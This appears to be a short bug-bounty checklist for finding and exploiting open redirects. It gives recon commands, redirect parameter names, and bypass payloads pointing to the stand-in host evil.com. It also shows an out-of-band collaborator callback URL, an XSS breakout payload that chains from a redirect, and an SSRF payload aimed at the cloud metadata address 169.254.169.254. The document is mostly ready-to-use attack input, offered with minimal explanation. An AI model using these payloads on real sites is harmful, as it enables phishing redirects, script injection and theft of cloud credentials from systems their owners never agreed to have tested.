**PAYLOAD LIST :** https://github.com/payloadbox/open-redirect-payload-list

- [ ]  katana -u subdomains.txt: to get all parameters and url
- [ ]  cat wayback | gf redirect
- CHECK FOR OPEN redirect on BROWSER not in burp
- Keywords : redirect, URL, path, next, return, rurl, dest, returnUrl, destination, redirect_uri, forward, redirect_to, callback(JSONP response), continue, page, site, target, go, from, view
    - change the param on successful redirect Open redirect is confirmed
    - Try entering the Collaborator URL
- [ ]  Try bypassing it by adding `@evil.com` after the original URL, which it is redirecting to
- [ ]  Try adding the all the bypasses after the actual domain
- [ ]  Try schemeless URL `//evil.com`,`https://target.com/x//evil.com`
- [ ]  `HTTP:\/\/evil.com`
- [ ]  `https://target.com/../evil.com`
- [ ]  If you found Redirect at one place, try to use it on other places also,o like `https://auth.paris.ctfio.com/auth?client_id=1&redirect_url=https://paris.ctfio.com/redirect_url=http://b4grmvykgml36vrniflutx9hn8tzhr5g.oastify.com`

### OR to XSS

- [ ]  Check for URLS where the site “Are you sure you want to leave this site?”
- [ ]  javascript:confirm()
    - If the URL which is redirecting is reflected in the source code (Inspect), then enter this payload and perform the action(click) where the URL was reflected
- [ ]  Upon reflection, you can break out of the context and inject any payload also
    
    `https://a4qpwq97.eu1.ctfio.com/leaving?next=https%3A%2F%2F503lipuecghx2pnhe9hopr5bj2ptdn1c.oastify.com"><img src=x onerror=confirm()>`

- [ ] `https://victim.com/image?url=../../../redirect?target=http://169.254.169.254/latest/meta-data`: for OR to SSRF
